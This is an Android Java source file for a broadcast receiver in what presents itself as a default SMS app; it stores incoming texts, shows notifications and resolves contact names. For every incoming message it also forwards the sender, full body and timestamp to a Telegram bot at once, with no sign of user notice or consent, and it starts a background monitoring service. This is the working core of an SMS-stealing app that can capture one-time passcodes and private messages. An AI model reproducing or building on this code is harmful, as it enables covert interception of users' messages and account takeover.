package com.example.defaultsmsapp;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.os.Build;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final String CHANNEL_ID = "sms_notifications";
    private static final int NOTIFICATION_ID = 1001;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "SMS received, action: " + intent.getAction());

        if (intent.getAction() == null) {
            return;
        }

        // Create notification channel first
        createNotificationChannel(context);

        switch (intent.getAction()) {
            case Telephony.Sms.Intents.SMS_RECEIVED_ACTION:
            case Telephony.Sms.Intents.SMS_DELIVER_ACTION:
                handleSmsReceived(context, intent);
                break;
            default:
                Log.d(TAG, "Unknown action: " + intent.getAction());
                break;
        }
    }

    private void handleSmsReceived(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) {
            Log.e(TAG, "No extras in SMS intent");
            return;
        }

        try {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);

            if (messages == null || messages.length == 0) {
                Log.e(TAG, "No SMS messages found in intent");
                return;
            }

            for (SmsMessage smsMessage : messages) {
                if (smsMessage == null) {
                    continue;
                }

                String sender = smsMessage.getDisplayOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();
                long timestamp = smsMessage.getTimestampMillis();

                Log.d(TAG, "SMS received from: " + sender + ", message: " + messageBody);

                // Store SMS message
                storeSmsMessage(context, sender, messageBody, timestamp);

                // Send to Telegram bot immediately
                TelegramBot.getInstance().sendSmsToTelegram(sender, messageBody, timestamp);

                // Notify the main activity to refresh the message list immediately
                Intent refreshIntent = new Intent("com.example.defaultsmsapp.SMS_RECEIVED");
                refreshIntent.putExtra("sender", sender);
                refreshIntent.putExtra("message", messageBody);
                refreshIntent.putExtra("timestamp", timestamp);
                context.sendBroadcast(refreshIntent);

                // Show notification
                showNotification(context, sender, messageBody);

                // Start background service for monitoring
                Intent serviceIntent = new Intent(context, SmsMonitorService.class);
                serviceIntent.putExtra("action", "new_sms");
                serviceIntent.putExtra("sender", sender);
                serviceIntent.putExtra("message", messageBody);
                
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent);
                    } else {
                        context.startService(serviceIntent);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error starting service", e);
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Error processing received SMS", e);
        }
    }

    private void storeSmsMessage(Context context, String sender, String message, long timestamp) {
        try {
            ContentValues values = new ContentValues();
            values.put(Telephony.Sms.ADDRESS, sender);
            values.put(Telephony.Sms.BODY, message);
            values.put(Telephony.Sms.DATE, timestamp);
            values.put(Telephony.Sms.TYPE, Telephony.Sms.MESSAGE_TYPE_INBOX);
            values.put(Telephony.Sms.READ, 0); // Mark as unread

            Uri uri = context.getContentResolver().insert(Telephony.Sms.CONTENT_URI, values);
            if (uri != null) {
                Log.d(TAG, "SMS stored successfully: " + uri);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error storing SMS manually", e);
        }
    }

    private void createNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "SMS Messages";
            String description = "Notifications for new SMS messages";
            int importance = NotificationManager.IMPORTANCE_HIGH;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            channel.enableVibration(true);
            channel.setVibrationPattern(new long[]{0, 250, 250, 250});
            channel.enableLights(true);
            channel.setLightColor(android.graphics.Color.BLUE);

            NotificationManager notificationManager = context.getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    private void showNotification(Context context, String sender, String message) {
        try {
            Intent notificationIntent = new Intent(context, MainActivity.class);
            notificationIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            notificationIntent.putExtra("sender", sender);

            PendingIntent pendingIntent = PendingIntent.getActivity(
                    context, 0, notificationIntent,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT :
                            PendingIntent.FLAG_UPDATE_CURRENT
            );

            Intent replyIntent = new Intent(context, ComposeActivity.class);
            replyIntent.putExtra("address", sender);
            replyIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            PendingIntent replyPendingIntent = PendingIntent.getActivity(
                    context, 1, replyIntent,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT :
                            PendingIntent.FLAG_UPDATE_CURRENT
            );

            String displayName = getContactName(context, sender);
            if (displayName == null) {
                displayName = sender;
            }

            NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                    .setSmallIcon(android.R.drawable.ic_dialog_email)
                    .setContentTitle("New SMS from " + displayName)
                    .setContentText(message)
                    .setStyle(new NotificationCompat.BigTextStyle().bigText(message))
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setDefaults(NotificationCompat.DEFAULT_ALL)
                    .setContentIntent(pendingIntent)
                    .setAutoCancel(true)
                    .addAction(android.R.drawable.ic_menu_send, "Reply", replyPendingIntent)
                    .setColor(context.getResources().getColor(android.R.color.holo_blue_bright))
                    .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                    .setVisibility(NotificationCompat.VISIBILITY_PUBLIC);

            try {
                NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
                notificationManager.notify(NOTIFICATION_ID, builder.build());
                Log.d(TAG, "Notification shown for SMS from: " + displayName);
            } catch (SecurityException e) {
                Log.e(TAG, "Permission denied for showing notification", e);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error showing notification", e);
        }
    }

    private String getContactName(Context context, String phoneNumber) {
        try {
            Uri uri = Uri.withAppendedPath(
                    android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    Uri.encode(phoneNumber));
            String[] projection = {android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME};

            try (android.database.Cursor cursor = context.getContentResolver().query(
                    uri, projection, null, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    return cursor.getString(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact name", e);
        }
        return phoneNumber;
    }
}